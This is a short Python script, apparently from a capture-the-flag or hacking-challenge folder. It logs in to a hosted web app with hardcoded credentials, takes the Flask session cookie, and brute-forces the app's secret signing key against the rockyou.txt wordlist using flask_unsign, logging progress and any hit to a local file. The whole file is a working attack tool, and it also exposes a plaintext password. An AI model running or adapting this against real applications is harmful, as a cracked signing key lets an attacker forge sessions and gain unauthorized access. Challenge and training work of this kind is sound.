import requests, flask_unsign as fu, time, sys

base = 'https://outofcontext-app.onrender.com'
s = requests.Session()
s.post(base + '/login', data={'username': 'compliance_officer', 'password': 'AuditPolicy2026!'}, timeout=40)
c = s.cookies.get('session')
out = open(r'F:\mission-git-hackss\mission-git-hackss\ooc\crack_result.txt', 'w')
out.write('cookie=' + str(c) + '\n')
out.flush()

wl = r'F:\mission-git-hackss\mission-git-hackss\rockyou.txt'
t0 = time.time()
n = 0
hit = None
with open(wl, 'rb') as f:
    for line in f:
        sk = line.rstrip(b'\r\n')
        if not sk:
            continue
        n += 1
        try:
            if fu.session.verify(c, sk.decode('latin-1')):
                hit = sk
                break
        except Exception:
            pass
        if n % 200000 == 0:
            out.write('progress %d %.0fs\n' % (n, time.time() - t0))
            out.flush()
out.write('DONE tried=%d time=%.1f HIT=%r\n' % (n, time.time() - t0, hit))
out.flush()
out.close()
